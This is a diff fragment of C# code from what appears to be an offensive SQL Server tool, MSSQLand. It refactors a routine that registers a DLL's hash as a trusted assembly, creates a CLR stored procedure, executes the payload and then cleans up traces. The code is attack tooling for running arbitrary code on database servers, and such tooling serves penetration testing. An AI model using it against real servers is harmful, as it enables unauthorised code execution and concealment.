@@ -63,7 +63,7 @@ namespace MSSQLand.Actions.Execution
             Logger.Info($"DLL Bytes Length: {libraryHexString.Length}");
 
             // Step 3: Generate random names for assembly and trusted hash path.
-            string dllPath = Guid.NewGuid().ToString("N").Substring(0, 6);
+            string assemblyDescription = Guid.NewGuid().ToString("N").Substring(0, 6);
             string assem = Guid.NewGuid().ToString("N").Substring(0, 6);
 
             // Step 4: Handle legacy SQL servers.
@@ -74,45 +74,8 @@ namespace MSSQLand.Actions.Execution
             }
             else
             {
-                // Step 5: Check if the DLL hash already exists in sys.trusted_assemblies.
-                string checkHash = databaseContext.QueryService.ExecuteScalar($"SELECT * FROM sys.trusted_assemblies WHERE hash = 0x{libraryHash};")?.ToString().ToLower();
-
-                if (checkHash?.Contains("permission was denied") == true)
+                if (databaseContext.ConfigService.RegisterTrustedAssembly(libraryHash, assemblyDescription) == false)
                 {
-                    Logger.Error("Insufficient privileges to perform this action");
-                    return;
-                }
-
-                if (checkHash?.Contains("system.byte[]") == true)
-                {
-                    Logger.Warning("Hash already exists in sys.trusted_assemblies");
-                    string deletionQuery = databaseContext.QueryService.ExecuteScalar($"EXEC sp_drop_trusted_assembly 0x{libraryHash};")?.ToString().ToLower();
-
-                    if (deletionQuery?.Contains("permission was denied") == true)
-                    {
-                        Logger.Error("Insufficient privileges to remove existing trusted assembly");
-                        return;
-                    }
-
-                    Logger.Success("Hash deleted");
-                }
-
-                // Step 6: Add the DLL hash into sys.trusted_assemblies.
-                databaseContext.QueryService.ExecuteNonProcessing($@"
-                    EXEC sp_add_trusted_assembly
-                    0x{libraryHash},
-                    N'{dllPath}, version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';
-                ");
-
-
-                // Verify that the SHA-512 hash has been added.
-                if (databaseContext.ConfigService.CheckTrustedAssembly(dllPath))
-                {
-                    Logger.Success($"Added hash 0x{libraryHash} as trusted");
-                }
-                else
-                {
-                    Logger.Error("Unable to add hash to sys.trusted_assemblies");
                     return;
                 }
             }
@@ -154,8 +117,8 @@ namespace MSSQLand.Actions.Execution
             Logger.Success($"Stored procedure '{_function}' created successfully");
 
             // Step 10: Execute the payload
-            Logger.Task("Executing payload");
-            Console.WriteLine(databaseContext.QueryService.ExecuteScalar($"EXEC {_function};"));
+            databaseContext.QueryService.ExecuteNonProcessing($"EXEC {_function};");
+            Logger.Success("Function executed");
 
             // Step 11: Cleanup - Drop procedure, assembly, and trusted hash.
             databaseContext.QueryService.ExecuteNonProcessing(dropProcedure);
@@ -169,7 +132,7 @@ namespace MSSQLand.Actions.Execution
                 databaseContext.QueryService.ExecuteNonProcessing($"ALTER DATABASE {databaseContext.Server.Database} SET TRUSTWORTHY OFF;");
             }
 
-            Logger.Success("Execution and cleanup completed");
+            Logger.Success("Cleanup completed");
         }
 
 
